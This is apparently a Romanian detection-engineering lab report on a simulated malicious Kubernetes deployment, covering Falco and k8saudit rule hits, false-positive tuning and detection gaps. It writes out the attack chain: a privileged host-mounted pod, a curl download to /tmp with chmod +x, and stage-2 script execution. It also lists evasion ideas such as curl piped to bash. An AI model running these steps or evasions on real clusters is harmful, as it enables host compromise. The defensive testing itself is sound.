# Scenariul 8 — Malicious Deployment

**MITRE ATT&CK:** T1610 (Deploy Container), T1105 (Ingress Tool Transfer), T1059.004 (Unix Shell)

## Pași de atac

1. **Deploy workload malițios** — `kubectl apply` un pod `malicious-pod` (privileged, `hostPID: true`, hostPath `/` montat la `/host`, image `ubuntu:22.04`). Simulează un atacator cu acces la K8s API care creează un container weaponizat. [T1610]
2. **Package manager în container care rulează** — `apt-get update && apt-get install -y curl` în `malicious-pod`. [T1610 / T1059]
3. **Descarcă payload în /tmp + chmod +x** — `curl -o /tmp/payload http://example.com/ && chmod +x /tmp/payload`. [T1105]
4. **Drop & execute script de stage-2 din /tmp** — `printf '#!/bin/bash...' > /tmp/stage2.sh && chmod +x /tmp/stage2.sh && bash /tmp/stage2.sh`. [T1059]
5. **"Instalează" și execută un binar dropat în /tmp** — `cp /bin/sleep /tmp/payload2 && chmod 777 /tmp/payload2 && /tmp/payload2 1`. [T1105 / T1059]
6. **Cleanup** — `kubectl delete pod malicious-pod`.

## Reguli relevante

| Regulă | Tip | Priority | Match pe |
|---|---|---|---|
| `K8S_THREAT: Package Manager in Running Container` | custom | Warning | `proc.name in (apt, apt-get, yum, dnf, apk, pip, …)` cu parent ≠ entrypoint — pasul 2 |
| `K8S_THREAT: Binary Downloaded and Executed` | custom | Critical | `chmod +x`/`chmod 777` în `/tmp/`–`/dev/shm/`, sau `bash`/`sh` rulând din `/tmp/`–`/dev/shm/` — pașii 3, 4, 5 |
| `K8S_THREAT: Data Exfiltration - Transfer Tool in Container` | custom | Warning | overlap pe `curl` (scenariul 7) — pasul 3 |
| `Launch Privileged Container` | default | Informational/Notice | `container.privileged = true` la pornirea pod-ului — pasul 1 (necesită metadata container — funcțional după helm rev 21) |
| `Launch Sensitive Mount Container` | default | — | hostPath `/` montat — pasul 1 |
| `Drop and execute new binary in container` | default | Critical | binare instalate/dropate post-startup (curl, /tmp/payload2) |

## Rezultate finale (helm rev 25, după iterația B)

### Falco — 9 detecții (toate true positive, 0 FP)

| Regulă | Tip | Priority | Count | Generată de |
|---|---|---|---|---|
| `Drop and execute new binary in container` | default | Critical | 3 | `openssl` (postinst ca-certificates), `curl` (pasul 3), `/tmp/payload2` (pasul 5) |
| `K8S_THREAT: Binary Downloaded and Executed` | custom | Critical | 3 | `chmod +x /tmp/payload` (pasul 3), `chmod +x /tmp/stage2.sh` (pasul 4), `chmod 777 /tmp/payload2` (pasul 5) |
| `K8S_THREAT: Package Manager in Running Container` | custom | Warning | 2 | `apt-get update`, `apt-get install -y curl` (pasul 2) |
| `K8S_THREAT: Data Exfiltration - Transfer Tool in Container` | custom | Warning | 1 | `curl` (pasul 3) — overlap s07 |
| **Total Falco** | | | **9** | |

> Baseline (helm rev 24, înainte de iterația B) era **10 detecții** — incluzând 1 FP: `frontend` (debconf) citind `/etc/shadow` în timpul `apt install`. Iterația B (adăugat `frontend` la `allowed_shadow_readers`, helm rev 25) → 0 FP. Vezi "Procesul de tuning".

### Bilanț detecție

| Step | Detectat? | Prin ce |
|---|---|---|
| 1 — deploy pod privilegiat | ❌ NU de Falco | acțiune la nivel de K8s API; regulile default `Launch Privileged Container` / `Launch Sensitive Mount Container` **nu s-au declanșat** (vezi observația #1) |
| 2 — package manager | ✅ DA | `Package Manager in Running Container` ×2 |
| 3 — curl download + chmod +x /tmp | ✅ DA | `Binary Downloaded and Executed` + `Data Exfil Transfer Tool` + `Drop and execute new binary` |
| 4 — drop & execute /tmp/stage2.sh | ✅ DA | `Binary Downloaded and Executed` (chmod +x /tmp) |
| 5 — install & execute /tmp/payload2 | ✅ DA | `Binary Downloaded and Executed` (chmod 777 /tmp) + `Drop and execute new binary` (exec /tmp/payload2) |

**Detection rate (pași cu alertă)**: 4/5 = 80% (pasul 1 — deployment-ul în sine — nedetectat, vezi mai jos).
**False positive rate**: 1 detecție din 10 (`frontend` citind `/etc/shadow` în timpul `apt install`) — fix propus în iterația B.

## Procesul de tuning

| Iterație | Modificare | Total | True+ | False+ |
|---|---|---|---|---|
| A (baseline, helm rev 24) | reguli existente | 10 | 9 | 1 (`frontend` debconf citește `/etc/shadow`) |
| B (propus) | adaugă `frontend` la lista `allowed_shadow_readers` (alături de `dpkg`, `dpkg-preconfigu`, `apt`, `apt-get`) | →9 | 9 | 0 |

## Re-validare pe helm rev 30 (2026-06-18)

### Detecții (10 = 9 TP + 1 FP nou)

| Regulă | Priority | Count (rev 30) | Tip |
|---|---|---|---|
| `Drop and execute new binary in container` | Critical | 3 | TP (openssl postinst, curl, /tmp/payload2) |
| `K8S_THREAT: Binary Downloaded and Executed` | Critical | 3 | TP (chmod pe /tmp/payload, /tmp/stage2.sh, /tmp/payload2) |
| `K8S_THREAT: Package Manager in Running Container` | Warning | 2 | TP (apt-get update + install curl) |
| `K8S_THREAT: Data Exfiltration - Transfer Tool` | Warning | 1 | TP (curl) |
| `K8S_THREAT: Write Below Sensitive Etc Path in Container` | Error | **1** | **FP (NOU)** |
| **Total** | | **10** | |

Diferența +1 față de rev 25: **același FP FIM ca la s06** — `ld.so.cache~` scris de `ldconfig.real`
(invocat de postinst-ul `apt install curl`); `ldconfig` nu e în allowlist-ul `package_mgmt_binaries`.
Vezi s06 pentru candidatul de tuning (adaugă `ldconfig`/`ldconfig.real` la allowlist SAU restrânge
path-urile `ld.so` la `ld.so.preload`/`ld.so.conf`). **FP-ul vechi `frontend`/`/etc/shadow` NU reapare**
(allowlist-ul `allowed_shadow_readers` din rev 25 ține). De notat: `apt install curl` **NU** a declanșat
`Write Below Binary Dir` pe `/usr/bin/curl` — `dpkg` e în `package_mgmt_binaries`, deci scrierea binarului
de pachet e corect allowlist-ată; doar `ldconfig` scapă.

## Strat API/admission — k8saudit (2026-06-27)

Activat stratul de detecție la **nivel Kubernetes API/audit** (plugin Falco `k8saudit`), care prinde
exact **pasul 1** (deploy-ul `malicious-pod`) — acțiunea K8s API pe care Falco syscall nu o vede. La
crearea pod-ului, k8saudit declanșează **3 reguli distincte de admission**:

| Regulă k8saudit | Cauză (config pod) |
|---|---|
| Create Privileged Pod | `securityContext.privileged: true` |
| Create Sensitive Mount Pod | `hostPath: /` |
| Create HostPid Pod | `hostPID: true` |

(Fără `Create HostNetwork Pod` — `malicious-pod` nu cere `hostNetwork`, spre deosebire de escape-pod-ul
s01.) `event.provider: k8s_audit`, prioritate Warning, index unificat `security-*` (6 evenimente brute =
3 reguli × 2 — duplicarea ×2 e un artefact al pipeline-ului falcosidekick). **Gap-ul "deployment
nedetectat" de la Observații #1 este închis în soluție**: `malicious-pod` e prins acum ȘI la admission
(configurația greșită), ȘI la runtime (pașii 2-5). Detalii: `falco-k8saudit/README.md`.

## Observații așteptate (de validat)

1. **Detecția deployment-ului — [ÎNCHIS 2026-06-27 via k8saudit]; *prevenția* — încă lipsește** — pasul 1 (deploy pod privilegiat) e o acțiune la nivel de K8s API, nu un syscall în pod-ul atacatorului, deci Falco *syscall* prinde doar **consecințele** (pașii 2-5), nu **actul** de creare. Inițial acesta era un gap (regulile default `Launch Privileged Container` / `Launch Sensitive Mount Container` nu sunt active — mutate la `maturity: incubating`/`sandbox` în Falco modern; iar plugin-ul `k8saudit` nu era activat). **Acum `k8saudit` e activat** și prinde `CREATE pod` cu `privileged:true`/`hostPath`/`hostPID` direct din audit log-ul K8s API (vezi secțiunea "Strat API/admission" — 3 reguli). **Lecție rămasă pentru Cap 6**: detecția la admission ≠ *prevenție* — `k8saudit` *alertează* asupra deployment-ului malițios, dar nu-l *blochează*; pentru blocare e nevoie de admission control (OPA/Gatekeeper, Kyverno sau Pod Security Admission), analizat în `docs/admission-control-recommendation.md` (acolo se arată cum `malicious-pod.yaml` ar fi respins la creare).

2. **`Binary Downloaded and Executed` — pattern comportamental robust** — prinde lanțul clasic "download → chmod → execute" indiferent de natura payload-ului (regula se uită la *locația* `/tmp`–`/dev/shm` + actul de a face executabil / a rula din ele, nu la conținut). Complementează `Drop and execute new binary` (care se uită la ctime vs container start).

3. **Cross-scenario overlap** — `apt-get` declanșează `Package Manager` (tag-uit `scenario_08`, dar îl folosim și ca prerequisite la scenariile 5/7). `curl` declanșează `Data Exfiltration - Transfer Tool` (s07). Pattern recurent: TTP-urile se suprapun natural — un container compromis rulează aceleași tool-uri indiferent de obiectivul final.

4. **`malicious-pod` e privilegiat** — pe lângă regulile de mai sus, orice acțiune din el (citire `/host/etc/shadow` via hostPath, etc.) ar fi prinsă de regulile de container escape (s01). Nu testăm asta aici (e domeniul s01), dar e o demonstrație că un pod privilegiat e un risc compus.

## Suricata
N/A pentru pașii 1, 2, 4, 5 (acțiuni locale / K8s API). Pasul 3 (`curl http://example.com/`) generează trafic HTTP spre extern — Suricata îl vede ca telemetrie (`flow`/`http`/`fileinfo`) dar fără signature de threat (download HTTP banal). Vezi discuția din `07-data-exfiltration` despre vizibilitate vs detecție.

## False negatives potențiale

- **Deployment malițios fără acțiuni post-deploy "zgomotoase"** — un pod cu o imagine deja-weaponizată (malware în ENTRYPOINT) ar evita `Package Manager`/`Binary Downloaded` (nimic nu se instalează/dropează post-startup); doar `Drop and execute new binary` (ctime) sau regulile default pe imagine/privilegii ar avea șansă.
- **Imagine din registry privat cu nume "legitim"** — Falco nu evaluează reputația imaginii; un `nginx:latest` care de fapt e malware ar trece neobservat la nivel de metadata.
- **Download via canal criptat + execuție in-memory** (`curl ... | bash`, fără a atinge disk-ul) — `Binary Downloaded and Executed` se uită la `/tmp`/`/dev/shm`; un pipe direct curl→bash nu atinge filesystem-ul. Parțial acoperit de `Drop and execute` dacă se materializează un binar.
- **`pip install` / `npm install` de pachete malițioase** — `Package Manager` prinde invocarea, dar nu distinge pachetul bun de cel rău.
